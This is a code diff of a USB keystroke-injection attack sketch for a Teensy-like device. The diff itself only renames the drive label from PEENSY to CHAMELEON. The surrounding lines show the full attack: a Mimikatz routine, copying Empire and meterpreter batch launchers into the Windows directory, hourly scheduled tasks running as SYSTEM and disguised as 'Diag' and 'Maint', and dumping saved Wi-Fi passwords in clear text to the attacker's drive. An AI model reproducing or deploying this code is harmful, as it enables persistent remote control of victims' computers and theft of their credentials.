@@ -252,7 +252,7 @@ void performMimikatz(void)
   delay(700);
 
   // For loop to find drive letter
-  Keyboard.println(F("$letter = Get-WmiObject Win32_Volume -Filter \"Label='PEENSY'\" | select -expand driveletter"));
+  Keyboard.println(F("$letter = Get-WmiObject Win32_Volume -Filter \"Label='CHAMELEON'\" | select -expand driveletter"));
   
   // extract the exe
   Keyboard.println(F("$shell = new-object -com shell.application"));
@@ -315,7 +315,7 @@ void setup(void)
     initVictim();
 
     // startEmpire
-    wincopy_from_sd_card("PE.bat" ,"%WINDIR%\\PE.bat","PEENSY",3,200);
+    wincopy_from_sd_card("PE.bat" ,"%WINDIR%\\PE.bat","CHAMELEON",3,200);
     delay(700);
     Keyboard.println(F(""));
     Keyboard.println(F("schtasks /create /ru SYSTEM /sc HOURLY /MO 12 /tn Diag /tr \"'cmd' /c start '' '%WINDIR%\\PE.bat'\""));
@@ -324,7 +324,7 @@ void setup(void)
     delay(300);
 
     // start meterpreter
-    wincopy_from_sd_card("msf.bat" ,"%WINDIR%\\msf.bat","PEENSY",3,200);
+    wincopy_from_sd_card("msf.bat" ,"%WINDIR%\\msf.bat","CHAMELEON",3,200);
     delay(700);
     Keyboard.println(F(""));
     Keyboard.println(F("schtasks /create /ru SYSTEM /sc HOURLY /MO 12 /tn Maint /tr \"'cmd' /c start '' '%WINDIR%\\msf.bat'\""));
@@ -357,7 +357,7 @@ void setup(void)
     delay(700);
     Keyboard.println(F("netsh wlan show profiles | Select-String -Pattern \"All User Profile\" | foreach {$_.ToString()} | foreach {$_.Replace(\"    All User Profile     : \",$null)} | foreach {netsh wlan show profiles name=\"$_\" key=clear} > $env:temp\\$filename"));
     delay(2000);
-    Keyboard.println(F("$letter = Get-WmiObject Win32_Volume -Filter \"Label='PEENSY'\" | select -expand driveletter"));
+    Keyboard.println(F("$letter = Get-WmiObject Win32_Volume -Filter \"Label='CHAMELEON'\" | select -expand driveletter"));
     delay(200);
     Keyboard.println(F("Move-Item \"$env:temp\\$filename\" \"$letter\\$filename\""));
     delay(200);
